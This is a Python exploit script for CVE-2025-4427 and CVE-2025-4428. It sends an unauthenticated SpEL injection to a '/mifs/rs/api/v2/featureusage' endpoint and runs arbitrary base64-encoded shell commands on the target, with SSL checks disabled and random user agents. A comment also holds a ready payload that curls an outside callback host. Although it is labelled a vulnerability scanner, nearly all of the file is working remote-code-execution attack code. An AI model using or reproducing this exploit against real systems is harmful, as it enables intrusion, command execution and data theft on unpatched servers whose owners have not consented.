"""
CVE-2025-4427 & CVE-2025-4428 Vulnerability Detection and Exploitation Tool
Version: 2.1
author: xie22
Enhanced with advanced security checks and modular architecture
"""
import argparse
import urllib3
import base64
import random
import logging
from urllib.parse import quote
from typing import Optional, Dict
import requests
import sys

# Disable SSL warnings for insecure connections
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging system
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('vuln_scanner.log'),  # File output
        logging.StreamHandler()  # Console output
    ]
)
# Global configuration constants
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
]

class VulnerabilityScanner:
    """Main scanner class handling vulnerability detection logic"""
    
    def __init__(self, target: str, timeout: int = 15, retries: int = 2):
        """
        Initialize scanner instance
        :param target: URL of the target system
        :param timeout: Request timeout in seconds
        :param retries: Number of connection retry attempts
        """
        self.target = self._validate_target(target)
        self.timeout = timeout
        self.retries = retries
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

    @staticmethod
    def _validate_target(url: str) -> str:
        """Validate and normalize target URL format"""
        if not url.startswith(('http://', 'https://')):
            raise ValueError("Target URL must start with http:// or https://")
        return url if url.endswith('/') else url + '/'

    def _generate_payload(self, command: str, shell_type: str = 'bash') -> str:
        """
        Generate encoded exploit payload
        :param command: Command to execute on target
        :param shell_type: Shell environment type (bash/sh)
        :return: URL-encoded payload string
        """
        try:
            # Base64 encode command to handle special characters
            b64_cmd = base64.b64encode(command.encode()).decode()
            
            # Construct shell command based on target environment
            if shell_type == 'bash':
                shell_cmd = f'echo {b64_cmd} | base64 -d | bash'
            elif shell_type == 'sh':
                shell_cmd = f'echo {b64_cmd} | base64 -d | sh'
            else:
                raise ValueError(f"Unsupported shell type: {shell_type}")

            # Build SpEL expression for Java injection
            spel = f'${{"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(new String[]{{"{shell_type}","-c","{shell_cmd}"}})}}'
            return quote(spel, safe='')
        except Exception as e:
            logging.error(f"Payload generation failed: {str(e)}")
            raise

    def _send_request(self, payload: str, proxies: Optional[Dict] = None) -> requests.Response:
        """
        Send HTTP request with retry mechanism
        :param payload: Generated exploit payload
        :param proxies: Proxy configuration dictionary
        :return: Server response object
        """
        url = f"{self.target}mifs/rs/api/v2/featureusage?format={payload}"
        logging.info(f"Final request URL: {url}")

        for attempt in range(self.retries + 1):
            try:
                response = self.session.get(
                    url,
                    verify=False,  # Bypass SSL verification
                    proxies=proxies,
                    timeout=self.timeout
                )
                return response
            except requests.exceptions.Timeout:
                if attempt == self.retries:
                    raise
                logging.warning(f"Request timeout, retrying ({attempt+1}/{self.retries})...")
            except requests.exceptions.RequestException as e:
                raise RuntimeError(f"Request failed: {str(e)}") from e
        return None
    # default payload: api/v2/featureusage?adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20nc0c.callback.red')%7d
    def test_vulnerability(self, command: str = 'id', proxies: Optional[Dict] = None, 
                         shell_type: str = 'bash', output_file: Optional[str] = None) -> bool:
        """
        Execute full vulnerability test sequence
        :param command: Command to execute on vulnerable target
        :param proxies: Proxy settings for request routing
        :param shell_type: Target system's shell environment
        :param output_file: File path to save command output
        :return: Boolean indicating vulnerability status
        """
        try:
            payload = self._generate_payload(command, shell_type)
            response = self._send_request(payload, proxies)
            
            # Analyze response for vulnerability indicators
            if response.status_code == 400 and 'Process[pid' in response.text:
                logging.info("Target system is VULNERABLE (CVE-2025-4427 + CVE-2025-4428)")
                logging.info(f"Command execution output:\n{response.text}")
                
                # Save results if output file specified
                if output_file:
                    with open(output_file, 'w') as f:
                        f.write(response.text)
                    logging.info(f"Results saved to: {output_file}")
                return True
                
            elif response.status_code == 401:
                logging.warning("Target not vulnerable (401 Unauthorized)")
            else:
                logging.warning(f"Unexpected response code: {response.status_code}")
                logging.debug(f"Full response content:\n{response.text}")
                
            return False
            
        except Exception as e:
            logging.error(f"Detection failure: {str(e)}")
            return False

def main():
    """Main entry point for command-line execution"""
    parser = argparse.ArgumentParser(
        description="Advanced Vulnerability Scanner (CVE-2025-4427 & CVE-2025-4428)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    # Argument definitions
    parser.add_argument('-H', '--host', required=True, 
                      help="Target URL (e.g., http://vulnerable-site.com/)")
    parser.add_argument('-c', '--command', default='id', 
                      help="Command to execute (default: id)")
    parser.add_argument('-s', '--shell', choices=['bash', 'sh'], default='bash',
                      help="Target shell environment (default: bash)")
    parser.add_argument('-x', '--proxy', 
                      help="Proxy configuration (e.g., http://127.0.0.1:8080)")
    parser.add_argument('-t', '--timeout', type=int, default=15, 
                      help="Request timeout in seconds (default: 15)")
    parser.add_argument('-r', '--retries', type=int, default=2, 
                      help="Connection retry attempts (default: 2)")
    parser.add_argument('-o', '--output', 
                      help="Output file path for results")
    
    args = parser.parse_args()
    
    try:
        # Initialize scanner with user parameters
        scanner = VulnerabilityScanner(
            target=args.host,
            timeout=args.timeout,
            retries=args.retries
        )
        
        # Configure proxy if provided
        proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
        
        # Execute vulnerability test
        if scanner.test_vulnerability(
            command=args.command,
            proxies=proxies,
            shell_type=args.shell,
            output_file=args.output
        ):
            sys.exit(0)  # Vulnerable exit code
        else:
            sys.exit(1)  # Secure exit code
            
    except Exception as e:
        logging.error(f"Critical error: {str(e)}")
        sys.exit(2)  # Error exit code

if __name__ == "__main__":
    main()
